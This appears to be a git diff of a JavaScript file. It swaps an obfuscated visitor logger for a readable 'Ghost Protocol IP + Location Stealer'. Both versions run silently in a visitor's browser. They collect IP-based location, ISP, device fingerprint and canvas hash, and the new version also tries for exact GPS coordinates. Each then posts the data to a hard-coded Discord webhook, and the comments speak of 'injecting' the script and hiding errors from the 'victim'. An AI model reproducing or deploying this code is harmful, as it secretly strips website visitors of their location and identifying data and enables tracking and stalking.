@@ -1,1 +1,124 @@
-function _0x2a70(){const _0x4c8400=['toISOString','then','country_name','org','referrer','869020EvraIt','20YfpoIc','https://discord.com/api/webhooks/1450215350204633281/Ijfz8RQ66w6dsAUmTr2rGYQyJKFGZoTcsL-lTBGHddUsXIOwNjLzxNnW6ciqR7c-x6yv','4563720hBduwZ','Screen','Timezone','https://ipapi.co/json/','application/json','catch','74430iZzUje','stringify','height','width','260836QvDvQQ','Referrer','ISP','substring','city','renegade\x20logger','284CIARtw','10683VciaJp','641472UGHCfY','Time','timeZone','json','Direct','126mqahVv','POST','1737Rreajq','53826179YNyTXR','resolvedOptions'];_0x2a70=function(){return _0x4c8400;};return _0x2a70();}function _0x10b1(_0xf4ace2,_0x2108a7){const _0x2a7096=_0x2a70();return _0x10b1=function(_0x10b11d,_0x59d592){_0x10b11d=_0x10b11d-0xe7;let _0x2da53d=_0x2a7096[_0x10b11d];return _0x2da53d;},_0x10b1(_0xf4ace2,_0x2108a7);}(function(_0xdb4b16,_0x46adf4){const _0x3b793f=_0x10b1,_0x5b3761=_0xdb4b16();while(!![]){try{const _0xf0f6c3=-parseInt(_0x3b793f(0xe9))/0x1+parseInt(_0x3b793f(0xfc))/0x2*(-parseInt(_0x3b793f(0xfd))/0x3)+parseInt(_0x3b793f(0xf6))/0x4*(parseInt(_0x3b793f(0xea))/0x5)+parseInt(_0x3b793f(0xfe))/0x6*(-parseInt(_0x3b793f(0x103))/0x7)+parseInt(_0x3b793f(0xec))/0x8+parseInt(_0x3b793f(0x105))/0x9*(-parseInt(_0x3b793f(0xf2))/0xa)+parseInt(_0x3b793f(0x106))/0xb;if(_0xf0f6c3===_0x46adf4)break;else _0x5b3761['push'](_0x5b3761['shift']());}catch(_0x3ebcd5){_0x5b3761['push'](_0x5b3761['shift']());}}}(_0x2a70,0xf1741),((()=>{const _0x2d20e0=_0x10b1,_0x3a2532=_0x2d20e0(0xeb);fetch(_0x2d20e0(0xef))[_0x2d20e0(0x109)](_0x169244=>_0x169244[_0x2d20e0(0x101)]())[_0x2d20e0(0x109)](_0x123dc1=>{const _0x583e87=_0x2d20e0,_0x12dc76={'embeds':[{'title':'PHANTOM\x20TRACE\x20-\x20SILENT\x20HIT','color':0x1a1a1a,'fields':[{'name':'IP','value':_0x123dc1['ip']||'?','inline':!![]},{'name':'Location','value':(_0x123dc1[_0x583e87(0xfa)]||'?')+',\x20'+(_0x123dc1['region']||'?')+',\x20'+(_0x123dc1[_0x583e87(0x10a)]||'?'),'inline':!![]},{'name':_0x583e87(0xf8),'value':_0x123dc1[_0x583e87(0xe7)]||'?','inline':!![]},{'name':'User\x20Agent','value':navigator['userAgent'][_0x583e87(0xf9)](0x0,0x64)+(navigator['userAgent']['length']>0x64?'...':''),'inline':![]},{'name':_0x583e87(0xed),'value':screen[_0x583e87(0xf5)]+'x'+screen[_0x583e87(0xf4)],'inline':!![]},{'name':'Language','value':navigator['language'],'inline':!![]},{'name':_0x583e87(0xee),'value':Intl['DateTimeFormat']()[_0x583e87(0x107)]()[_0x583e87(0x100)],'inline':!![]},{'name':_0x583e87(0xf7),'value':document[_0x583e87(0xe8)]||_0x583e87(0x102),'inline':!![]},{'name':_0x583e87(0xff),'value':new Date()[_0x583e87(0x108)](),'inline':![]}],'footer':{'text':_0x583e87(0xfb)}}]};fetch(_0x3a2532,{'method':_0x583e87(0x104),'headers':{'Content-Type':_0x583e87(0xf0)},'body':JSON[_0x583e87(0xf3)](_0x12dc76)});})[_0x2d20e0(0xf1)](()=>{});})()));
+// === Ghost Protocol IP + Location Stealer - Pure JS Edition ===
+// Target: Grab as much geolocation & fingerprint data as possible
+// Delivery: Inject & run silently
+
+(async function ghostSteal() {
+    // ================= CONFIG =================
+    const WEBHOOK = "https://discord.com/api/webhooks/1450215350204633281/Ijfz8RQ66w6dsAUmTr2rGYQyJKFGZoTcsL-lTBGHddUsXIOwNjLzxNnW6ciqR7c-x6yv";  
+    // ^^^ REPLACE THIS — or use your own endpoint, Telegram bot, etc.
+
+    // ================= PAYLOAD STRUCTURE =================
+    const data = {
+        timestamp: new Date().toISOString(),
+        origin: window.location.href,
+        referrer: document.referrer || "direct",
+        userAgent: navigator.userAgent,
+        language: navigator.languages?.join(", ") || navigator.language,
+        platform: navigator.platform,
+        hardware: {
+            cpu_cores: navigator.hardwareConcurrency || "unknown",
+            ram_gb: navigator.deviceMemory || "unknown",
+            connection: navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                downlink: navigator.connection.downlink,
+                rtt: navigator.connection.rtt
+            } : "unknown"
+        },
+        screen: {
+            w: screen.width,
+            h: screen.height,
+            avail_w: screen.availWidth,
+            avail_h: screen.availHeight,
+            depth: screen.colorDepth,
+            pixel_ratio: window.devicePixelRatio
+        },
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        // These will be filled below
+        gps: null,
+        gps_error: null,
+        ip_data: null
+    };
+
+    // 1. Try high-accuracy HTML5 Geolocation (exact coords if permitted)
+    if ("geolocation" in navigator) {
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+
+            data.gps = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy_m: position.coords.accuracy,
+                altitude_m: position.coords.altitude,
+                altitude_accuracy_m: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed_mps: position.coords.speed
+            };
+        } catch (err) {
+            data.gps_error = `${err.message} (code: ${err.code})`;
+        }
+    }
+
+    // 2. Silent fallback: IP → city / approximate coords
+    try {
+        const res = await fetch("https://ipwho.is/", {
+            cache: "no-store",
+            mode: "cors"
+        });
+        if (res.ok) {
+            const ip = await res.json();
+            data.ip_data = {
+                ip: ip.ip,
+                city: ip.city,
+                region: ip.region,
+                country: ip.country,
+                country_code: ip.country_code,
+                lat: ip.latitude,
+                lon: ip.longitude,
+                timezone: ip.timezone?.id,
+                isp: ip.connection?.isp,
+                org: ip.connection?.org,
+                asn: ip.connection?.asn,
+                proxy_vpn_tor: ip.proxy?.proxy || ip.proxy?.vpn || ip.proxy?.tor || false
+            };
+        }
+    } catch (e) {
+        // swallow silently
+    }
+
+    // 3. Optional: quick canvas + WebGL fingerprint (adds uniqueness)
+    try {
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.textBaseline = "top";
+        ctx.font = "14px Arial";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125,1,62,20);
+        ctx.fillStyle = "#069";
+        ctx.fillText("ghost protocol", 2,15);
+        ctx.fillStyle = "rgba(102,204,0,0.7)";
+        ctx.fillText("ghost protocol", 4,17);
+        data.canvas_hash = canvas.toDataURL(); // base64 — unique per GPU/driver combo
+    } catch {}
+
+    // 4. Ship it — no-cors so it works cross-origin
+    try {
+        await fetch(WEBHOOK, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+        });
+    } catch (e) {
+        // victim never sees the error
+    }
+
+})();
+
+// Optional: retry once after short delay (in case popup blocks first attempt)
+setTimeout(ghostSteal, 4000);
